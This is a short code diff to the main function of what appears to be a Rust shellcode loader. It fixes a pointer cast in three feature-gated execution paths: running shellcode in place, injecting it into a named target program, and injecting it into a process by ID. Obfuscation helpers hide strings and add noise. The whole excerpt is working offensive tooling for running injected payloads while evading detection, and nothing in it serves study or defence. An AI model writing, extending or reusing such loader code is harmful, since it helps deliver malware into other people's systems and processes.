@@ -88,7 +88,7 @@ fn main() {
         obfuscation_noise();
 
         #[cfg(feature = "pattern1")]
-        if let Err(e) = exec(shellcode_ptr) {
+        if let Err(e) = exec(shellcode_ptr as usize) {
             println!("{} {}", obf_lit!("Failed to execute:"), e);
             process::exit(1);
         }
@@ -96,7 +96,7 @@ fn main() {
         #[cfg(feature = "pattern2")] 
         {
             let target_program = String::from_utf8(target::TARGET_PROGRAM.clone()).unwrap();
-            if let Err(e) = exec(shellcode_ptr, _shellcode_len, &target_program) {
+            if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, &target_program) {
                 println!("{} {}", obf_lit!("Failed to execute:"), e);
                 process::exit(1);
             }
@@ -105,7 +105,7 @@ fn main() {
         #[cfg(feature = "pattern3")]
         {
             let pid = target::TARGET_PID;
-            if let Err(e) = exec(shellcode_ptr, _shellcode_len, pid as usize) {
+            if let Err(e) = exec(shellcode_ptr as usize, _shellcode_len, pid as usize) {
                 println!("{} {}", obf_lit!("Failed to execute:"), e);
                 process::exit(1);
             }
